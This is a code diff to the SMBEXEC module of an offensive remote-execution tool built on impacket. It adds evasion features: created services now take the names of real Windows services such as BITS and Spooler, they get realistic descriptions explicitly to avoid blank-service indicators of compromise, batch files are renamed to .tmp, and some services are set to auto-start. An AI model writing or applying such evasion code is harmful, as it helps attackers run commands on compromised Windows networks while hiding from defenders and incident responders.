@@ -1,10 +1,44 @@
 import os
+import random
 from os.path import join as path_join
 from time import sleep
 from impacket.dcerpc.v5 import transport, scmr
 from nxc.helpers.misc import gen_random_string
 from nxc.paths import TMP_PATH
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
+
+LEGIT_SERVICE_NAMES = [
+    "W32Time", "SENS", "wuauserv", "BITS", "cryptsvc",
+    "TrustedInstaller", "msiserver", "WerSvc", "Schedule",
+    "Winmgmt", "Spooler", "SysMain", "bthserv", "WlanSvc",
+    "DispBroker", "DeviceInstall", "DiagTrack", "lmhosts",
+    "PlugPlay", "ProfSvc", "Themes", "Audiosrv", "wercplsupport",
+]
+
+LEGIT_SERVICE_DESCRIPTIONS = [
+    "Manages system time synchronization",
+    "Manages system event notifications",
+    "Enables the detection, download, and installation of updates",
+    "Transfers files in the background using idle network bandwidth",
+    "Provides key management services",
+    "Provides software installation services",
+    "Manages Windows error reporting",
+    "Manages scheduled tasks",
+    "Provides management data and operations",
+    "Manages print jobs and print spooler",
+    "Improves system performance over time",
+    "Manages Bluetooth device services",
+    "Manages wireless network connections",
+    "Manages display device broker services",
+    "Manages device installation services",
+    "Tracks system diagnostics and usage",
+    "Manages TCP/IP NetBIOS helper services",
+    "Manages plug and play device support",
+    "Manages user profile service",
+    "Manages desktop theme services",
+    "Manages audio device services",
+    "Manages Windows Error Reporting support",
+]
 
 
 class SMBEXEC:
@@ -14,7 +48,7 @@ class SMBEXEC:
         self.__port = port
         self.__username = username
         self.__password = password
-        self.__serviceName = gen_random_string()
+        self.__serviceName = random.choice(LEGIT_SERVICE_NAMES)
         self.__domain = domain
         self.__lmhash = ""
         self.__nthash = ""
@@ -92,7 +126,7 @@ class SMBEXEC:
 
     def execute_remote(self, data):
         self.__output = gen_random_string(6)
-        self.__batchFile = gen_random_string(6) + ".bat"
+        self.__batchFile = gen_random_string(6) + ".tmp"
 
         command = self.__shell + "echo " + data + f" ^> \\\\%COMPUTERNAME%\\{self.__share}\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}" if self.__retOutput else self.__shell + data
 
@@ -110,9 +144,20 @@ class SMBEXEC:
                 self.__serviceName,
                 self.__serviceName,
                 lpBinaryPathName=command,
-                dwStartType=scmr.SERVICE_DEMAND_START,
+                dwStartType=random.choice([scmr.SERVICE_DEMAND_START, scmr.SERVICE_AUTO_START]),
             )
             service = resp["lpServiceHandle"]
+
+            # Set realistic service description to avoid blank service IOCs
+            try:
+                scmr.hRChangeServiceConfig2W(
+                    self.__scmr,
+                    service,
+                    scmr.SERVICE_CONFIG_DESCRIPTION,
+                    random.choice(LEGIT_SERVICE_DESCRIPTIONS),
+                )
+            except Exception:
+                pass
         except Exception as e:
             if "rpc_s_access_denied" in str(e):
                 self.logger.fail("SMBEXEC: Create services got blocked.")
@@ -180,7 +225,7 @@ class SMBEXEC:
 
     def execute_fileless(self, data):
         self.__output = gen_random_string(6)
-        self.__batchFile = gen_random_string(6) + ".bat"
+        self.__batchFile = gen_random_string(6) + ".tmp"
         local_ip = self.__rpctransport.get_socket().getsockname()[0]
 
         command = self.__shell + data + f" ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else self.__shell + data
@@ -200,9 +245,20 @@ class SMBEXEC:
             self.__serviceName,
             self.__serviceName,
             lpBinaryPathName=command,
-            dwStartType=scmr.SERVICE_DEMAND_START,
+            dwStartType=random.choice([scmr.SERVICE_DEMAND_START, scmr.SERVICE_AUTO_START]),
         )
         service = resp["lpServiceHandle"]
+
+        # Set realistic service description
+        try:
+            scmr.hRChangeServiceConfig2W(
+                self.__scmr,
+                service,
+                scmr.SERVICE_CONFIG_DESCRIPTION,
+                random.choice(LEGIT_SERVICE_DESCRIPTIONS),
+            )
+        except Exception:
+            pass
 
         try:
             self.logger.debug(f"Remote service {self.__serviceName} started.")
